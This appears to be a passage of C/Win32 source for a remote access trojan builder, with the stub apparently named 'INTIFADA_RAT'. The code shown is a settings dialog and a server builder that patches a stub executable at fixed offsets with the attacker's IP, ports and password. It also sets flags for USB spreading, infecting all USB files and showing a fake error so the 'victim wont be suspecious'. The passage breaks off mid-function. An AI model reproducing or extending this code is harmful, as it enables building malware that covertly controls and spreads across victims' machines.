            sprintf(MPort, "%s", getmport);

          if(IsDlgButtonChecked(hwndSEDlg, IDC_SAVE_DPATH1) == BST_CHECKED)
          {
            if(strlen(getdlpath) == 0)
            {
                MessageBox(NULL,"File destination not specified","ERROR",MB_OK | MB_ICONERROR);
                return 0;
            }
          }


           if(IsDlgButtonChecked(hwndSEDlg, IDC_REFRESH_USR) == BST_CHECKED)
          {
                    HWND hCombo = GetDlgItem ( hwndSEDlg, IDC_REFRESHTIME );
                    int combo = SendMessage ( hCombo, CB_GETCURSEL, 0, 0 );

					switch ( combo )
					{
						case 0:
							lstrcpy(RefTime,"15");
							break;
						case 1:
							lstrcpy(RefTime,"30");
							break;
						case 2:
							lstrcpy(RefTime,"60");
							break;
					}
           }
            //char IPME[]="127.0.0.1";

            SetSockDataBase(0,atoi(MPort),atoi(UPort),atoi(FPort));
            CreateSettingsDatabase(atoi(NotifyConnDB), atoi(RefreshUsrDB), atoi(AutoListenDB), atoi(DLPathONDB), atoi(DLPathOFFDB), atoi(ShowDLDB), atoi(KeepDlLogDB), atoi(AutoPortDB), atoi(ManPortDB), atoi(ShowULDB), atoi(InstanceDB), atoi(RefTime), getpass, getdlpath);

            EndDialog(hwndSEDlg,0);

            //MessageBox(NULL,"Settings saved","DONE",MB_OK | MB_ICONINFORMATION);
            InitSettings();

            if(strstr(RefreshUsers,"ON"))
            {
              RefHandle = CreateThread(NULL, 0,REFRESH_USERS,(LPVOID)"", 0, &thread);
            }

            else
            {
             TerminateThread(RefHandle,0);
            }




        }
        }
    }
    return TRUE;

    case WM_NOTIFY:
    {
        switch (((LPNMHDR)lParam)->code)
        {
        case TCN_SELCHANGE:
        {
            int iPage = TabCtrl_GetCurSel(GetDlgItem(hwndSEDlg,SETTING_TAB ));

            switch(iPage)
            {

            case 0:
            {
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC0 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC1 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, ID_MAINPORT_EDIT ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC2 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC3 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SET_OK_BUTTON ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC4 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_DL_PATHBUTTON ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_KEEP_DLOG ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SAVE_DPATH1 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SAVE_DPATH2 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SHOW_DLPROG ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SETPORTS_MANUAL ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SETPORTS_AUTO ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC5 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_NOT_NEWUSR ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_REFRESH_USR ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC6 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_AUTO_LISTEN ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC7 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SERV_PASSEDT ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_REFRESHTIME ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC8 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_ONE_INSTANCE ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SHOW_ULPROG ),SW_HIDE);
            }
            break;


            case 1:
            {
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC0 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC1 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, ID_MAINPORT_EDIT ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC2 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC3 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SET_OK_BUTTON ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SETPORTS_MANUAL ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SETPORTS_AUTO ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC4 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_DL_PATHBUTTON ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_KEEP_DLOG ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SAVE_DPATH1 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SAVE_DPATH2 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SHOW_DLPROG ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC5 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_NOT_NEWUSR ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_REFRESH_USR ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC6 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_AUTO_LISTEN ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC7 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SERV_PASSEDT ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_REFRESHTIME ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC8 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_ONE_INSTANCE ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SHOW_ULPROG ),SW_HIDE);
            }
            break;


            case 2:
            {
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC0 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC1 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, ID_MAINPORT_EDIT ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC2 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC3 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, ID_UPLDLPORT_EDIT ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, ID_UTILPORT_EDIT ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SETPORTS_MANUAL ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SETPORTS_AUTO ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SET_OK_BUTTON ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC4 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_DOWNLOAD_PATH ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_DL_PATHBUTTON ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_KEEP_DLOG ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SAVE_DPATH1 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SAVE_DPATH2 ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SHOW_DLPROG ),SW_SHOW);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC5 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_NOT_NEWUSR ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_REFRESH_USR ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC6 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_AUTO_LISTEN ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC7 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SERV_PASSEDT ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_REFRESHTIME ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SSTATIC8 ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_ONE_INSTANCE ),SW_HIDE);
             ShowWindow(GetDlgItem(hwndSEDlg, IDC_SHOW_ULPROG ),SW_SHOW);
            }
            break;

            }
        }
        }
    }
    return TRUE;


    }
    return FALSE;

}






/////////////////////////////////////////////////////////////////////////////////////////////////
//Edit Server
BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, char * Name)
{
    HGLOBAL hRes;
    HRSRC hResInfo;
    HANDLE hFile;
    DWORD dwBytes;
    HANDLE hProcess;

    char	strTmpPath[MAX_PATH];
    char	strBinPath[MAX_PATH];

    strcpy(strBinPath, Name);

    //ssageBox(NULL, strBinPath, "strBinPath", MB_OK);

    hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
    if (hResInfo == NULL)
    {
        MessageBox(NULL, "Failed", "FindResource", MB_OK);
        return FALSE;
    }

    hRes = LoadResource(hModule, hResInfo);
    if (hRes == NULL)
    {
        MessageBox(NULL, "Failed", "LoadResource", MB_OK);
        return FALSE;
    }
    hFile = CreateFile
            (strBinPath,
             GENERIC_WRITE,
             FILE_SHARE_WRITE,
             NULL,
             CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL,
             NULL
            );

    if (hFile == NULL)
    {
        MessageBox(NULL, "Failed", "CreateFile", MB_OK);
        return FALSE;
    }
    WriteFile(hFile, hRes, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
    //essageBox(NULL, strBinPath, "Buffer", MB_OK);
    CloseHandle(hFile);
    FreeResource(hRes);
    MessageBox(NULL, "DONE", "DONE", MB_OK);
    return FALSE;
    return TRUE;
}
#define BYTE_OFFSET_IP		949564//0x00007780 //offset of our Buffer.
#define BYTE_OFFSET_PORTA	904388//0X00007810 //offset of our Buffer.
#define BYTE_OFFSET_PORTB	904398//0X0000781C //offset of our Buffer.
#define BYTE_OFFSET_PORTC	904408//0x00006094 //offset of our Buffer.
#define BYTE_OFFSET_INF 	905167//0x00006094 //offset of our Buffer.
#define BYTE_OFFSET_INFPLUS 904352//0x00006094 //offset of our Buffer.
#define BYTE_OFFSET_SHOWERR 905187//0x00006094 //offset of our Buffer.
#define BYTE_OFFSET_ERRMSG  905024//0x00006094 //offset of our Buffer.
#define BYTE_OFFSET_ERRTTLE 905094//0x00006094 //offset of our Buffer.
#define BYTE_OFFSET_SETPASS 905207//0x00006094 //offset of our Buffer.
#define BYTE_OFFSET_AUTSOCK 905227//0x00006094 //offset of our Buffer.
#define BYTE_OFFSET_PASSKEY 905117//0x00006094 //offset of our Buffer.

LRESULT CALLBACK EditProc(HWND hwndEDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    int Select;
    char IP_ [30] = "127.0.0.1";
    char PORTA_ [15] = "";
    char PORTB_ [15] = "";
    char PORTC_ [15] = "";
    char SName []= "*.exe";
    char passkey[30],errmsg[70],errtitle[25];
    char Spread2USB[20]="USBSPREAD_ON";
    char InfectUSBFiles[25]="INFECTALLUSBFILE_ON";
    char Show1stModErr[20]="SHO1STMODERR_ON";
    char SetSecurityPass[20]="SECURITYPASS_ON";
    char isAutoSocket[20]="AUTO_SOCK_ON";
    char Name [MAX_PATH]; //= "Notepad.exe";
    char Stub [MAX_PATH];// = "INTIFADA_RAT.exe";
    char StubR [MAX_PATH];
    DWORD ret=0;
    HANDLE hFile;
    char test [MAX_PATH];
    char show[MAX_PATH];
    POINT pt;
    RECT  rect,rect2,rect3;
    //char testico[]="C:\\Users\\Physics(SWEP2011)\\Desktop\\C++\\WIN_LIST_2\\icon2.ico";
    HICON hAIcon;

    switch(message)
    {
////////////////////////////////////////////////////////////////////////////////
    case WM_INITDIALOG:
{

        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_STUBNAME ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_IP ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_PROCESS ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_NEXT ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_MAINPORT ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC1 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_FILEPORT ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC3 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC4 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC5 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC6 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC7 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC8 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC9 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC10 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC11 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_PASSWORD ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_PASS_EDIT ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC14 ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_QUESTIONPASS ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_SOCKINFO ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_AUTOSOCK_GEN ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_MANSOCK_GEN ),SW_SHOW);


        ShowWindow(GetDlgItem(hwndEDlg, IDC_BACK ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC2 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_INF ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_INFPLUS ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ICOSTATIC ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EDIT_STUBIMG ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_BROWSE_IMG ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_BROWSE_IMG ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ADDICON ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_BUILD ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC12 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_EXT_SPOOF ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC13 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_SPOOF ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ESTATIC15 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_MSG ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_EDT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TEST ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_QUESTIONERR ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TITLE ),SW_HIDE);





        EnableWindow(GetDlgItem(hwndEDlg, IDC_BROWSE_IMG), FALSE);
        EnableWindow(GetDlgItem(hwndEDlg, IDC_PASS_EDIT), FALSE);
        EnableWindow(GetDlgItem(hwndEDlg, IDC_ERROR_EDT), FALSE);
        EnableWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TEST), FALSE);
        EnableWindow(GetDlgItem(hwndEDlg, IDC_EXT_SPOOF), FALSE);
        EnableWindow(GetDlgItem(hwndEDlg, IDC_ERROR_TITLE), FALSE);
        EnableWindow(GetDlgItem(hwndEDlg, IDC_EDIT_PROCESS), FALSE);
        EnableWindow(GetDlgItem(hwndEDlg, IDC_EDIT_FILEPORT), FALSE);


        SetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_IP), IP_);
        SetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_MAINPORT), PORTA_);
        SetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_FILEPORT), PORTB_);
        SetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_PROCESS),  PORTC_);
        SetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_STUBNAME), SName);

        SendMessage(hwndEDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
        SendMessage(hwndEDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));

        CheckDlgButton(hwndEDlg,IDC_AUTOSOCK_GEN,BST_CHECKED);

       /*HWND button1 =  GetDlgItem(hwndEDlg,IDC_BUILD);
        HANDLE hIBitMap = LoadImage(GetModuleHandle(NULL),MAKEINTRESOURCE(IDB_BUILD),IMAGE_BITMAP,18,17,LR_DEFAULTCOLOR);
        SendMessage(button1,BM_SETIMAGE,IMAGE_BITMAP,(LPARAM)hIBitMap);*/

        hwndpassQ = GetDlgItem(hwndEDlg,IDC_QUESTIONPASS);



        hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_QUESTIONX), IMAGE_ICON, 16, 16, 0);
	    	SendMessage(GetDlgItem(hwndEDlg, IDC_QUESTIONPASS), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
	    	SendMessage(GetDlgItem(hwndEDlg, IDC_QUESTIONERR), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
        SendMessage(GetDlgItem(hwndEDlg, IDC_SOCKINFO), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);


       // hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_INFOX), IMAGE_ICON, 16, 16, 0);
		//SendMessage(GetDlgItem(hwndEDlg, IDC_SOCKINFO), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);

}
break;


	case WM_MOUSEMOVE:
    {
        GetCursorPos(&pt);
		GetWindowRect(GetDlgItem(hwndEDlg, IDC_QUESTIONPASS), &rect);
        GetWindowRect(GetDlgItem(hwndEDlg, IDC_QUESTIONERR), &rect2);
        GetWindowRect(GetDlgItem(hwndEDlg, IDC_SOCKINFO), &rect3);

		if(PtInRect(&rect, pt))
		{
			SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));

      hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_QUESTIONX), IMAGE_ICON, 17, 17, 0);
	  	SendMessage(GetDlgItem(hwndEDlg, IDC_QUESTIONPASS), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
	  	break;
		}

		if(PtInRect(&rect2, pt))
		{
			SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));

      hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_QUESTIONX), IMAGE_ICON, 17, 17, 0);
	  	SendMessage(GetDlgItem(hwndEDlg, IDC_QUESTIONERR), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
	  	break;
		}

	 /* if(PtInRect(&rect3, pt))
		{
			SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));

      hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_QUESTIONX), IMAGE_ICON, 17, 17, 0);
	  	SendMessage(GetDlgItem(hwndEDlg, IDC_SOCKINFO), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
		}*/

		else
		{
      SendMessage(tooltip,TTM_DELTOOL,0,(LPARAM)(LPTOOLINFO)(&ti));
      hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_QUESTIONX), IMAGE_ICON, 16, 16, 0);
      SendMessage(GetDlgItem(hwndEDlg, IDC_QUESTIONPASS), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
      SendMessage(GetDlgItem(hwndEDlg, IDC_QUESTIONERR), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
      SendMessage(GetDlgItem(hwndEDlg, IDC_SOCKINFO), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
		}

    }
    break;


    case WM_LBUTTONDOWN:
	{

	    GetCursorPos(&pt);
        GetWindowRect(GetDlgItem(hwndEDlg, IDC_QUESTIONPASS), &rect);
        GetWindowRect(GetDlgItem(hwndEDlg, IDC_QUESTIONERR), &rect2);
        GetWindowRect(GetDlgItem(hwndEDlg, IDC_SOCKINFO), &rect3);


		if(PtInRect(&rect, pt))
		{
		    SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
			  AddBalloonTip(hwndEDlg, "To prevent unauthorized access to your generated server", "Password server");
		}


		if(PtInRect(&rect2, pt))
		{
		    SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
			AddBalloonTip(hwndEDlg, "Sever displays error message when its first module loads, So victim wont be suspecious :-) ","Display Error Message");
		}

		if(PtInRect(&rect3, pt))
		{
		    SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
			AddBalloonTip(hwndEDlg, "Make sure you fill in all ports, failure to do so may result in connection problems", "Info");
		}


		else
		{
		    break;
		}
	}
	break;


    case WM_NOTIFY:
    {
     switch (((LPNMHDR)lParam)->code)
     {


     }

    }
    return TRUE;




    case WM_COMMAND:
        Select=LOWORD(wParam);
        switch(Select)
        {
        case IDC_BUILD:
        {

            GetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_IP), IP_, 30);
            GetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_MAINPORT), PORTA_, 15);
            GetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_FILEPORT), PORTB_, 15);
            GetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_PROCESS),  PORTC_, 15);
            GetWindowText(GetDlgItem(hwndEDlg, IDC_EDIT_STUBNAME), SName, 20);
            GetWindowText(GetDlgItem(hwndEDlg, IDC_PASS_EDIT), passkey, 30);
            GetWindowText(GetDlgItem(hwndEDlg, IDC_ERROR_EDT), errmsg, 70);
            GetWindowText(GetDlgItem(hwndEDlg, IDC_ERROR_TITLE), errtitle, 25);
            //ReleaseResource(NULL, IDR_EXE, "BINARY", Name);


            if(strstr(SName,".exe"))
            {
                goto Cont;
            }
            else
            {
                strcat(SName,".exe");
            }

Cont:

            ZeroMemory(&test[0],sizeof(test));
            ZeroMemory(&show[0],sizeof(show));

            GetModuleFileName(GetModuleHandle(NULL),test,MAX_PATH);


            int r = 0;

            for(r = strlen(test); r > 0; r--)
            {
                if(test[r]=='\\')
                {

                    //MessageBox(NULL, show, "POS", MB_OK);
                    break;

                }

            }

            for(int i = 0; i<r; i++)
            {
                show[i]=test[i];
            }
            //MessageBox(NULL, show, "POS", MB_OK);

            strcpy(Name,show);
            strcat(Name,"\\");
            strcat(Name,SName);

            strcpy(Stub,show);
            strcat(Stub,"\\");
            strcat(Stub,"Make");
            strcat(Stub,"\\");
            strcat(Stub,"Make");

 /*           strcpy(StubR,show);
            strcat(StubR,"\\");
            strcat(StubR,"Make");
            strcat(StubR,"\\");
            strcat(StubR,"make.exe");*/


// open Server.exe for editing
            CopyFile(Stub,Name,FALSE);
            Sleep(1);
            hFile = CreateFile(Name, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

            if(hFile == INVALID_HANDLE_VALUE)
            {
                MessageBox(NULL, "Server could not be Generated", "ERROR", MB_OK|MB_ICONERROR);
                return -0;
            }



           if(strlen(IP_)==0)
          {
                 MessageBox(hwndEDlg,"IP/DNS not set","Error",MB_OK|MB_ICONERROR);
                 CloseHandle(hFile);
                 unlink(Name);
                 break;
          }

            SetFilePointer(hFile, BYTE_OFFSET_IP, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, IP_, sizeof("256.256.256.256"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

           if(strlen(PORTA_)==0)
          {
                 MessageBox(hwndEDlg,"Main port not set","Error",MB_OK|MB_ICONERROR);
                 CloseHandle(hFile);
                 unlink(Name);
                 break;
          }

            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_PORTA, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, PORTA_, sizeof("55555"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

         if(IsDlgButtonChecked(hwndEDlg, IDC_MANSOCK_GEN) == BST_CHECKED)
         {

           if(strlen(PORTB_)==0)
          {
                 MessageBox(hwndEDlg,"File port not set","Error",MB_OK|MB_ICONERROR);
                 CloseHandle(hFile);
                 unlink(Name);
                 break;
          }


           if(strlen(PORTC_)==0)
          {
                 MessageBox(hwndEDlg,"Utility port not set","Error",MB_OK|MB_ICONERROR);
                 CloseHandle(hFile);
                 unlink(Name);
                 break;
          }

            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_PORTC, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, PORTB_, sizeof("55555"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_PORTB /*BYTE_OFFSET_PROC*/, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, PORTC_/*Process*/, sizeof("55555"/*"xxxxxxxxxxxxxxxxxxxxx"*/), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

            }

           else
           {
            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_PORTC, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, "NULL", sizeof("55555"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_PORTB /*BYTE_OFFSET_PROC*/, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, "NULL"/*Process*/, sizeof("55555"/*"xxxxxxxxxxxxxxxxxxxxx"*/), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/
           }

           if(IsDlgButtonChecked(hwndEDlg, IDC_AUTOSOCK_GEN) == BST_CHECKED)
           {
            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_AUTSOCK , NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, isAutoSocket, sizeof("AUTO_SOCK_OFF"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/
           }

           if(IsDlgButtonChecked(hwndEDlg, IDC_INF) == BST_CHECKED)
           {
            ret=0;
            SetFilePointer(hFile, BYTE_OFFSET_INF, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
            WriteFile(hFile, Spread2USB, sizeof("USBSPREAD_OFF"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/
           }

            if(IsDlgButtonChecked(hwndEDlg, IDC_INFPLUS) == BST_CHECKED)
            {
            ret=0;
